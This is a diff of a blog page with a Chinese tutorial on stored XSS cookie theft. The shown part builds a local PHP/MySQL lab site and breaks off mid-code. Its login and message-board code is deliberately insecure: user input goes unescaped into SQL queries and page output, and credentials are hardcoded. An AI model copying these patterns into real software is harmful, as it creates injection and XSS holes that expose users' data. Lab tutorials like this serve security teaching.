@@ -6,15 +6,31 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Archives: 2020/11 | Hexo</title>
+  <title>Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
+  <meta name="description" content="@TOC 实战:存储型XSS攻击获取Cookie及防御一些XSS攻击的心得，感觉课本上的例子有点简单，所以写了一个带有Cookie的简单测试网站。攻击不得到点东西怎么行~">
+<meta property="og:type" content="article">
 <meta property="og:title" content="Hexo">
-<meta property="og:url" content="http://example.com/archives/2020/11/index.html">
+<meta property="og:url" content="http://example.com/2020/11/13/%E5%AE%9E%E6%88%98_%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E8%8E%B7%E5%8F%96Cookie%E5%8F%8A%E9%98%B2%E5%BE%A1/index.html">
 <meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="@TOC 实战:存储型XSS攻击获取Cookie及防御一些XSS攻击的心得，感觉课本上的例子有点简单，所以写了一个带有Cookie的简单测试网站。攻击不得到点东西怎么行~">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201105234212295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/2020110523483517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201105235255757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201106000147742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201106000229100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201106000646510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201106001947279.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201106003227131.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201106003538278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201106003625299.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="og:image" content="https://img-blog.csdnimg.cn/20201106151234847.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
+<meta property="article:published_time" content="2020-11-13T08:21:17.339Z">
+<meta property="article:modified_time" content="2020-11-13T08:45:05.103Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img-blog.csdnimg.cn/20201105234212295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center">
   
     <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -150,64 +166,204 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-实战_存储型XSS攻击获取Cookie及防御" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>@<a href="%E5%AE%9E%E6%88%98:%E5%AD%98%E5%82%A8%E5%9E%8BXSS%E6%94%BB%E5%87%BB%E8%8E%B7%E5%8F%96Cookie%E5%8F%8A%E9%98%B2%E5%BE%A1">TOC</a></p>
+<h1 id="实战-存储型XSS攻击获取Cookie及防御"><a href="#实战-存储型XSS攻击获取Cookie及防御" class="headerlink" title="实战:存储型XSS攻击获取Cookie及防御"></a>实战:存储型XSS攻击获取Cookie及防御</h1><p>一些XSS攻击的心得，感觉课本上的例子有点简单，所以写了一个带有Cookie的简单测试网站。攻击不得到点东西怎么行~</p>
+<a id="more"></a>
+
+<h1 id="一、存储型XSS攻击原理"><a href="#一、存储型XSS攻击原理" class="headerlink" title="一、存储型XSS攻击原理"></a>一、存储型XSS攻击原理</h1><p>在讲解存储型XSS攻击之前，我们要先明白XSS是个什么东西。</p>
+<p>XSS（Cross Site Scripting）跨站脚本攻击，是指攻击者利用Web服务器中的应用程序或代码漏洞，在页面中嵌入客户端脚本（通常是一段由JavaScript编写的恶意代码），当信任此Web服务器的用户访问Web站点中含有恶意脚本代码的页面或打开收到的URL链接时，用户浏览器会自动加载并执行恶意代码，达到攻击的目的。</p>
+<p>XSS分为反射型、存储型和DOM型。这里我们只对存储型进行解释，存储型XSS又叫持久型XSS，XSS代码被攻击者存储到服务器中，因此用户在访问含有存储型XSS代码的网站时就会被攻击。</p>
+<h1 id="二、搭建测试网站"><a href="#二、搭建测试网站" class="headerlink" title="二、搭建测试网站"></a>二、搭建测试网站</h1><p>了解了存储型XSS是怎么达到攻击目的的，那么我们接下来就要在本机搭建一个测试网站啦。</p>
+<h2 id="1-phpstudy开启Apache和mysql服务"><a href="#1-phpstudy开启Apache和mysql服务" class="headerlink" title="1.phpstudy开启Apache和mysql服务"></a>1.phpstudy开启Apache和mysql服务</h2><p><img src="https://img-blog.csdnimg.cn/20201105234212295.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="2-搭建数据库"><a href="#2-搭建数据库" class="headerlink" title="2.搭建数据库"></a>2.搭建数据库</h2><p>我用的是Navicat创建的数据库和表，也可以上网自己找方法搭建。<br>数据库名xsstest，表是message_board和user，还有两个表中相应的字段。</p>
+<p><img src="https://img-blog.csdnimg.cn/2020110523483517.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="3-创建网站文件"><a href="#3-创建网站文件" class="headerlink" title="3.创建网站文件"></a>3.创建网站文件</h2><p>打开phpstudy的WWW目录，创建一个xsstest文件夹，在里面创建如图圈出的文件。</p>
+<p><img src="https://img-blog.csdnimg.cn/20201105235255757.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="4-书写代码"><a href="#4-书写代码" class="headerlink" title="4.书写代码"></a>4.书写代码</h2><p>登录界面：login.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;xss登陆&lt;&#x2F;title&gt;</span><br><span class="line">		&lt;style&gt;</span><br><span class="line">			body&#123;</span><br><span class="line">				padding: 0;</span><br><span class="line">				margin: 0;</span><br><span class="line">				font-size:30px;&#x2F;&#x2F;字体大小</span><br><span class="line">			&#125;</span><br><span class="line">			.main&#123;</span><br><span class="line">				position: fixed;</span><br><span class="line">				top: 50%;</span><br><span class="line">				left: 50%;</span><br><span class="line">				margin-left: -245px;</span><br><span class="line">				margin-top: -201.5px;</span><br><span class="line">				width: 490px;</span><br><span class="line">				height: 403px;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">			input&#123;</span><br><span class="line">				width:250px;</span><br><span class="line">				height:30px;</span><br><span class="line">				text-align:left;</span><br><span class="line">				color:blue;</span><br><span class="line">			&#125;</span><br><span class="line">			.sub&#123;</span><br><span class="line">				width:125px;</span><br><span class="line">				height:30px;</span><br><span class="line">			&#125;</span><br><span class="line">			button&#123;</span><br><span class="line">				width:125px;</span><br><span class="line">				height:30px;</span><br><span class="line">				text-align:left;</span><br><span class="line">			&#125;</span><br><span class="line">			.nav&#123;</span><br><span class="line">				padding-top: 80px;</span><br><span class="line">				padding-left: 115px;</span><br><span class="line">				width: 260px;</span><br><span class="line">			&#125;</span><br><span class="line">			img&#123;</span><br><span class="line">				width: 100%;</span><br><span class="line">				height: 100%;</span><br><span class="line">			&#125;</span><br><span class="line">		&lt;&#x2F;style&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;img src&#x3D;&quot;login.png&quot; &gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;main&quot;&gt;</span><br><span class="line">		&lt;form class&#x3D;&quot;nav&quot; action&#x3D;&quot;post.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">		用户名 ：&lt;br &#x2F;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="line">		密码 ：  &lt;br &#x2F;&gt;&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt; &lt;br&gt;</span><br><span class="line">		             &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;登陆&quot; class&#x3D;&quot;sub&quot;&gt;</span><br><span class="line">				     &lt;button&gt;&lt;a href&#x3D;&quot;reg.php&quot;&gt;注册&lt;&#x2F;a&gt;&lt;&#x2F;button&gt;</span><br><span class="line">				</span><br><span class="line">		&lt;&#x2F;form&gt;</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201106000147742.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>登陆验证：post.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">       $conn&#x3D;mysqli_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;root&#39;) or die(&quot;数据库连接失败！&quot;);&#x2F;&#x2F;连接你的本地数据库</span><br><span class="line">       &#x2F;&#x2F;localhost为服务器 root为用户名 root为密码</span><br><span class="line"></span><br><span class="line">       mysqli_select_db($conn,&#39;xsstest&#39;) or die(&quot;您要选择的数据库不存在&quot;);&#x2F;&#x2F;选择你建立的数据表</span><br><span class="line"></span><br><span class="line">       $name&#x3D;$_POST[&#39;username&#39;];</span><br><span class="line"></span><br><span class="line">       $pwd&#x3D;$_POST[&#39;password&#39;];&#x2F;&#x2F;获取表单提交的内容用两个变量来存post方式接受的值</span><br><span class="line"></span><br><span class="line">       $sql&#x3D;&quot;select * from user where username&#x3D;&#39;$name&#39; and password&#x3D;&#39;$pwd&#39;&quot;;&#x2F;&#x2F;查询语句</span><br><span class="line"></span><br><span class="line">       $query&#x3D;mysqli_query($conn, $sql);&#x2F;&#x2F;函数执行一条 MySQL 查询。</span><br><span class="line"></span><br><span class="line">       $arr&#x3D;mysqli_fetch_array($query);&#x2F;&#x2F;然后从$query中取一行数字数组</span><br><span class="line"></span><br><span class="line">       if(is_array($arr))&#123;&#x2F;&#x2F;对$arr进行判断</span><br><span class="line">			  setcookie(&#39;username&#39;,$name,time()+3600);</span><br><span class="line">			  &#x2F;&#x2F;设置cookie,时间为一小时，（以秒为单位）</span><br><span class="line">              header(&quot;Location:index.php&quot;);&#x2F;&#x2F;跳转页面</span><br><span class="line"></span><br><span class="line">       &#125;else&#123;</span><br><span class="line"></span><br><span class="line">              echo &quot;您的用户名或密码输入有误，&lt;a href&#x3D;\&quot;login.php\&quot;&gt;请重新登录！&lt;&#x2F;a&gt;&quot;;</span><br><span class="line"></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>登陆成功界面：index.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if(!isset($_COOKIE[&#39;username&#39;]))&#x2F;&#x2F;对跳转方式判断，阻止直接跳转；</span><br><span class="line">	&#123;</span><br><span class="line">		echo &#39;登录非法!&lt;a href&#x3D;&quot;login.php&quot;&gt;请登录&lt;&#x2F;a&gt;&#39;;</span><br><span class="line">		exit();</span><br><span class="line">	&#125;</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html &gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;xss测试网站&lt;&#x2F;title&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">	&lt;style&gt;</span><br><span class="line">		.message&#123;</span><br><span class="line">			margin-top: 50px;</span><br><span class="line">		&#125;</span><br><span class="line">		form&#123;</span><br><span class="line">			margin-top: 50px;</span><br><span class="line">		&#125;</span><br><span class="line">		input&#123;</span><br><span class="line">			width: 400px;</span><br><span class="line">		&#125;</span><br><span class="line">		.btn&#123;</span><br><span class="line">			margin-top: 5px;</span><br><span class="line">			width: 100px;</span><br><span class="line">		&#125;</span><br><span class="line">	&lt;&#x2F;style&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;  </span><br><span class="line">	Hello 靓仔!</span><br><span class="line">	&lt;a href&#x3D;&quot;logout.php&quot;&gt;注销&lt;&#x2F;a&gt;   &#x2F;&#x2F;点击“ 注销 ”跳转页面</span><br><span class="line">	</span><br><span class="line">	&lt;div class&#x3D;&quot;message&quot;&gt;</span><br><span class="line">		&lt;table border&#x3D;&quot;1&quot; width&#x3D;&quot;500px&quot;&gt;</span><br><span class="line">			&lt;tr&gt;</span><br><span class="line">				&lt;td&gt;留言内容&lt;&#x2F;td&gt;</span><br><span class="line">			&lt;&#x2F;tr&gt;</span><br><span class="line">			&lt;?php</span><br><span class="line">				$db &#x3D; @mysqli_connect(&#39;localhost&#39;,&#39;root&#39;,&#39;root&#39;) or die(&quot;Fail&quot;);</span><br><span class="line">				mysqli_select_db($db, &#39;xsstest&#39;);</span><br><span class="line">				$sql &#x3D; &quot;select message from message_board;&quot;;</span><br><span class="line">				$result &#x3D; mysqli_query($db, $sql);</span><br><span class="line">				</span><br><span class="line">				if($result) &#123;</span><br><span class="line">					while($row&#x3D;mysqli_fetch_array($result)) &#123;</span><br><span class="line">						echo &quot;&lt;tr&gt;&lt;td&gt; &#123;$row[&#39;message&#39;]&#125; &lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&quot;;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				mysqli_close($db);</span><br><span class="line">			</span><br><span class="line">			?&gt;</span><br><span class="line">		&lt;&#x2F;table&gt;</span><br><span class="line">	&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;form action&#x3D;&quot;message.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">		在这里输入你的留言内容：&lt;&#x2F;br&gt;</span><br><span class="line">		&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;mess&quot;&gt;&lt;&#x2F;br&gt;</span><br><span class="line">		&lt;input class&#x3D;&quot;btn&quot; type&#x3D;&quot;submit&quot;&#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201106000229100.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>登出页面：logout.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	if(isset($_COOKIE[&#39;username&#39;]))&#123;</span><br><span class="line">		setcookie(&#39;username&#39;,$name,time()-1);&#x2F;&#x2F;清除cookie 将时间设置为负数</span><br><span class="line">		header(&#39;Location:login.php&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">	else&#123;</span><br><span class="line">		echo &#39;注销失败&#39;;</span><br><span class="line">		header(&#39;Location:index.php&#39;);</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>注册页面：reg.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;xss注册&lt;&#x2F;title&gt;</span><br><span class="line">		&lt;style&gt;</span><br><span class="line">			body&#123;</span><br><span class="line">				padding: 0;</span><br><span class="line">				margin: 0;</span><br><span class="line">				font-size:30px;&#x2F;&#x2F;字体大小</span><br><span class="line">			&#125;</span><br><span class="line">			.main&#123;</span><br><span class="line">				position: fixed;</span><br><span class="line">				top: 50%;</span><br><span class="line">				left: 50%;</span><br><span class="line">				margin-left: -245px;</span><br><span class="line">				margin-top: -201.5px;</span><br><span class="line">				width: 490px;</span><br><span class="line">				height: 403px;</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line">			input&#123;</span><br><span class="line">				width:250px;</span><br><span class="line">				height:30px;</span><br><span class="line">				text-align:left;</span><br><span class="line">				color:blue;</span><br><span class="line">			&#125;</span><br><span class="line">			.sub&#123;</span><br><span class="line">				width:125px;</span><br><span class="line">				height:30px;</span><br><span class="line">			&#125;</span><br><span class="line">			button&#123;</span><br><span class="line">				width:125px;</span><br><span class="line">				height:30px;</span><br><span class="line">				text-align:left;</span><br><span class="line">			&#125;</span><br><span class="line">			.nav&#123;</span><br><span class="line">				padding-top: 80px;</span><br><span class="line">				padding-left: 115px;</span><br><span class="line">				width: 260px;</span><br><span class="line">			&#125;</span><br><span class="line">			img&#123;</span><br><span class="line">				width: 100%;</span><br><span class="line">				height: 100%;</span><br><span class="line">			&#125;</span><br><span class="line">		&lt;&#x2F;style&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;img src&#x3D;&quot;reg.png&quot; &gt;</span><br><span class="line">		&lt;div class&#x3D;&quot;main&quot;&gt;</span><br><span class="line">		&lt;form class&#x3D;&quot;nav&quot; action&#x3D;&quot;regin.php&quot; method&#x3D;&quot;post&quot;&gt;</span><br><span class="line">		用户名&lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot;&gt;&lt;br&gt;</span><br><span class="line">		密码  &lt;br&#x2F;&gt;&lt;input type&#x3D;&quot;password&quot; name&#x3D;&quot;password&quot;&gt; &lt;br&gt;</span><br><span class="line">		           &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;注册&quot; class&#x3D;&quot;sub&quot;&gt;</span><br><span class="line">		    &lt;&#x2F;body&gt;</span><br><span class="line">			&lt;&#x2F;div&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20201106000646510.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTM1OTkw,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
+<p>注册提交：regin.php</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">     $conn&#x3D;mysqli_connect(&quot;localhost&quot;,&#39;root&#39;,&#39;root&#39;) or die(&quot;数据库连接失败！&quot;);</span><br><span class="line"></span><br><span class="line">     mysqli_select_db($conn,&#39;xsstest&#39;) or die(&quot;您要选择的数据库不存在&quot;);</span><br><span class="line">     $name&#x3D;trim($_POST[&#39;username&#39;]);</span><br><span class="line">	&#x2F;&#x2F;trim函数，过滤空格，如果不加，我们在用户名后面添加很多空格，提交表单，打开firebug</span><br><span class="line">	&#x2F;&#x2F;调试工具，我们可以到输入的用户名后面会有很多空格，使用trim函数，我们可以把表单中空格给过滤掉</span><br><span class="line">	 $password&#x3D;$_POST[&#39;password&#39;];</span><br><span class="line">	 $sql &#x3D; &quot;select * from user where username&#x3D;&#39;$name&#39;&quot;;</span><br><span class="line">	 $info &#x3D; mysqli_query($conn, $sql);</span><br><span class="line">	 $res &#x3D; mysqli_num_rows($info);</span><br><span class="line">	if(empty($name))&#123;</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&#39;用户名不能为空&#39;);location.href&#x3D;&#39;reg.php&#39;;&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">	&#125;else if(empty($password))&#123;</span><br><span class="line">		echo &quot;&lt;script&gt;alert(&#39;密码不能为空&#39;);location.href&#x3D;&#39;reg.php&#39;;&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">	&#125;else&#123;	</span><br><span class="line">		if($res)&#123;</span><br><span class="line">			echo &quot;&lt;script&gt;alert(&#39;用户名已存在&#39;);location.href&#x3D;&#39;reg.php&#39;;&lt;&#x2F;script&gt;&quot;;</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			$sql1 &#x3D;&quot;insert into user(username,password) values(&#39;&quot;.$name.&quot;&#39;,&#39;&quot; .($password).&quot;&#39;)&quot;;</span><br><span class="line">			$result &#x3D; mysqli_query($conn, $sql1);</span><br><span class="line">			if($result)&#123;</span><br><span 